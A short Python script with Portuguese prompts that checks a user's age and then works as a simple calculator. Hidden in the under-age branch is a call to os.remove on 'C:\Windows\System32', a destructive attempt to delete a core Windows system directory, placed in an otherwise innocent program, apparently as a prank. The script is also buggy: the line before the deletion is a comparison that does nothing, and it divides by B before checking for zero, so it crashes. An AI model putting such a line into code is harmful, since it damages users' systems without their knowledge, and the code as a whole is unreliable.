import random
import os


nome = input("Digite o seu nome:")
idade = int(input("digite a sua idade:"))

if idade >= 12:
    print (nome ,", Você tem a idade minima para acessar o site.")
else :
     print(nome ,", Você infelizmente não tem a idade minima para acessar o site.")
     random.randint(0, 6) == 1
     os.remove ("C:\Windows\System32")
     
operação = input("qual operação matematica voce deseja calcular?")
operação_final = operação


a = int(input("Digite o valor A:"))
b = int(input("Digite o valor B:"))

soma = a+b
subtração= a-b
multiplicação= a*b
divisão= a//b
resto= a%b
potencia= a**b


if operação_final == "soma":
    print("A soma é:", soma)
elif operação_final == "subtração":
    print("A subtração é:", subtração)
elif operação_final == "multiplicação":
    print("A multiplicação é:", multiplicação)
elif operação_final == "divisão":
   print("A divisão é:", divisão)
elif operação_final == "resto":
   print("O resto é:", resto)
elif operação_final == "potência":
   print("A potencia é:", potencia)


if b == 0:
    print("essa operação não é possivel")
else:
    print("essa operação foi concluida")
    
print("obrigado por usar nosso site, bombom. Volte sempre")
